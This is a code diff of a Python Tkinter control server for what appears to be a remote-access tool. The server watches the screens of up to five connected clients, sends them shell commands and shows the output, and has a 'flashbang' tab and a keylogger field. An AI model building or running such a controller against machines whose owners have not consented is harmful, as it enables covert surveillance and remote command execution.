@@ -9,7 +9,6 @@ from PIL import Image, ImageTk, UnidentifiedImageError
 import io
 import threading
 import socket
-import ast
 import sys
 
 connectionsNum = 0
@@ -19,6 +18,15 @@ connectionNumThing = str(connectionsNum) + " Connections!"
 client_sockets = [None] * 5
 
 
+# ----------------------------------------------------------------
+# The Variable Guide!
+# Since there are a lot of variables, I will list a few of them and their purpose here.
+# connectionsNum - number of connections, used in the UI
+# client_sockets - list of client sockets, this is now used to store the image sockets of clients
+# clients - a string, used in the CAMS system to check for empty slots
+# client_labels - labels used to show the slots of clients, used in the UI
+# current_client - an integer used in the screen veiw system, to keep track of the screen veiw and to scroll through each client screen.
+# ----------------------------------------------------------------
 class ScreenSharingServer:
     def __init__(self, master, host="0.0.0.0", image_port=5001, command_port=5002):
         self.master = master
@@ -48,6 +56,7 @@ class ScreenSharingServer:
         self.client_infos = [{}] * 5
         self.current_info_index = 0
 
+        self.keyLog = None
         self.canvas = objTK.Canvas(master, bg="black")
         self.canvas.pack(fill=objTK.BOTH, expand=True)
 
@@ -60,11 +69,6 @@ class ScreenSharingServer:
             master, text="Next", command=self.next_client, width=20
         )
         self.next_button.pack(padx=5, pady=5, side=objTK.RIGHT)
-
-        self.info_button = objTTK.Button(
-            objHomeTab, text="Next Client Log ▶", command=self.next_info, width=20
-        )
-        self.info_button.place(x=385, y=455)
 
         # General Commands tab
         self.flashbangLabel = objTTK.Label(
@@ -108,23 +112,17 @@ class ScreenSharingServer:
             while True:
                 # Accept command socket connection
                 command_socket, address = self.command_server_socket.accept()
-                print(f"Command connection from {address} has been established!")
+                print(
+                    "---------------------------------------------------------------------------"
+                )
+                print(f"| Command connection from {address} has been established! |")
 
                 # Accept image socket connection
                 image_socket, _ = self.image_server_socket.accept()
-                print(f"Image connection from {address} has been established!")
-
-                # Receive client info from command socket
-                client_info = command_socket.recv(1024).decode("utf-8")
-                client_info = ast.literal_eval(client_info)
-
-                for i in range(5):
-                    if not self.client_infos[i]:
-                        self.client_infos[i] = client_info
-                        break
-
-                self.update_info_display()
-                command_socket.send("received".encode("utf-8"))
+                print(f"| Image connection from {address} has been established!   |")
+                print(
+                    "---------------------------------------------------------------------------"
+                )
 
                 empty_slot = None
                 for i in range(5):
@@ -257,14 +255,10 @@ class ScreenSharingServer:
             self.client_sockets[index].close()
             self.client_sockets[index] = None
         self.clients[index] = "Client Disconnected"
-        clientInfoFrameText.config(state="normal")
-        clientInfoFrameText.delete(1.0, objTK.END)
-        clientInfoFrameText.insert(objTK.END, f"Client Disconnected :(\n")
-        clientInfoFrameText.config(state="disabled")
         connectionsNum -= 1
         self.update_client_labels(
             index, "Client Disconnected", "Client Disconnected", connectionsNum
-        )  # Update label to indicate disconnection
+        )
 
     def disconnect(self):
         for sock in self.client_sockets:
@@ -278,21 +272,6 @@ class ScreenSharingServer:
             client_labels[index].config(text=f"IPv4: {ipv4} | IPv6: {ipv6}")
         else:
             client_labels[index].config(text="Client Disconnected")
-
-    def next_info(self):
-        self.current_info_index = (self.current_info_index + 1) % 5
-        self.update_info_display()
-
-    def update_info_display(self):
-        clientInfoFrameText.config(state="normal")
-        clientInfoFrameText.delete(1.0, objTK.END)
-        if self.client_infos[self.current_info_index]:
-            clientInfoFrameText.insert(
-                objTK.END, f"Client: {self.current_info_index + 1}\n"
-            )
-            for key, value in self.client_infos[self.current_info_index].items():
-                clientInfoFrameText.insert(objTK.END, f"{key}: {value}\n")
-        clientInfoFrameText.config(state="disabled")
 
     def startScreenShare(self):
         clientToStartScreenShare = objDialog.askinteger(
@@ -440,24 +419,6 @@ connections5_label = objTTK.Label(objHomeTab, text=clients[4], font=normalFont)
 client_labels[4] = connections5_label
 connections5_label.place(x=40, y=290)
 
-clientInfoFrame = objTK.Frame(
-    objHomeTab, bg="#252525", bd=2, highlightthickness=0, borderwidth=0
-)
-clientInfoFrame.place(x=382, y=5, width=500, height=440)
-
-clientInfoFrameText = objTK.Text(
-    clientInfoFrame,
-    font=terminalFont,
-    bg="#252525",
-    fg="#fff",
-    state="disabled",
-    highlightthickness=0,
-    borderwidth=0,
-    padx=5,
-    pady=5,
-)
-clientInfoFrameText.place(x=0, y=0, width=500, height=440)
-
 
 # Remote CMD tab
 class CustomCommandPrompt:
@@ -508,14 +469,28 @@ class CustomCommandPrompt:
         self.output_text.config(state="normal")
         command = self.command_entry.get()
         cmdSend = "CMD" + command
+        if server.command_sockets[self.index] == None and self.index != 0:
+            self.output_text.insert(
+                objTK.END,
+                f"Error: Client {self.index + 1} is not connected or has disconnected. Switching back to Client 1\n",
+            )
+            self.index = 0
+            return
+        elif server.command_sockets[self.index] == None and self.index == 0:
+            self.output_text.insert(
+                objTK.END,
+                f"Error: There are no active/connected client or there is an issue with the Client Address Management System (CAMS). Check if there are any connected clients, if there is and it is not in the first array, report the issue in Github. \n",
+            )
+            self.index = 0
+            return
         input = server.command_sockets[self.index].send(cmdSend.encode("utf-8"))
         response = server.command_sockets[self.index].recv(1024)
         response_text = response.decode("utf-8")
-        if response_text.startswith("CMDOUTPUT"):
-            print_output = response_text[9:]
+        if response_text.startswith("[CMDOUT]"):
+            print_output = response_text[8:]
             self.output_text.insert(objTK.END, f"$ {command}\n")
             self.output_text.insert(objTK.END, f"{print_output}\n")
-        self.command_entry.delete(0, objTK.END)
+            self.command_entry.delete(0, objTK.END)
         self.output_text.config(state="disabled")
         self.output_text.yview_moveto(1.0)
 
@@ -523,7 +498,6 @@ class CustomCommandPrompt:
 terminal = CustomCommandPrompt(objSettingsTab1)
 
 # Screen View tab
-tabControl.add(objSettingsTab2, text="Screen View")
 server = ScreenSharingServer(objSettingsTab2)
 
 
@@ -551,27 +525,12 @@ def shutDown():
         if objMessageBox.askyesno(
             title="LAST WARNING", message="Are you really sure?!"
         ):
-            # Close all sockets
-            for sock in server.command_sockets:
-                if sock:
-                    try:
-                        sock.close()
-                    except Exception as e:
-                        print(f"Error closing command socket: {e}")
-            server.disconnect()
-            stop_all_threads()
+            # Closes everythin
+            root.quit()  # stops event-loop
+            root.after_idle(
+                root.quit
+            )  # if this line is omitted, the window will be closed immediately
             root.destroy()
-
-
-def stop_all_threads():
-    for thread in threading.enumerate():
-        if thread.name != "MainThread":
-            try:
-                ctypes.pythonapi.PyThreadState_SetAsyncExc(
-                    ctypes.c_long(thread.ident), ctypes.py_object(SystemExit)
-                )
-            except Exception as e:
-                print(f"Error while stopping thread {thread.name}: {e}")
 
 
 center_widget(tabControl)
